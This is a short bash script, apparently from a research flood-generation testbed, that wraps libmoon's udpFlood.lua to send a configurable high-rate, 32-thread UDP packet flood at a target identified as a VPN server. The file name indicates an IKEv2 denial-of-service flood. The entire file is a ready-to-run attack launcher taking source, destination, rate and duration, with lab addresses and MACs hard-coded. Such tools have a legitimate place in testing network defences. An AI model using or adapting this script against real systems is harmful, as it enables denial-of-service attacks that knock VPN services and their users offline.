#!/bin/bash

# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration>
# e.g.
# sudo bash ikev2Flood.sh 172.31.116.132 172.31.116.137 1000 10 all_1.pcap 1000000 128

# cd to directory of script
scriptDir=$(dirname -- "$(readlink -f -- "$BASH_SOURCE")")
cd "$scriptDir"

# prepare Flood Generator framework
source ../prepFloodGenerator.sh

############## Flood Configuration ##############

ipSrc=$1
ipDst=$2
attackRate=$3
seconds=$4

flows=${5:-1}
pktLength=${6:-252} #default value 252
port=${7:-443} # default value 443

# more fixed configuration values (adjust if needed)
ethSrc="3c:fd:fe:9e:8e:39"
udpSrc=$port

# VPN server addresses
ethDst="b0:aa:77:2f:ab:1a"
udpDst=$port


############## Flood Start ##############

$libmoonBuild/libmoon udpFlood.lua \
    --seconds $seconds --threads 32 --flows $flows --rate $attackRate \
    --pktLength $pktLength \
    --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
    --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
    --startConfirmation \
    0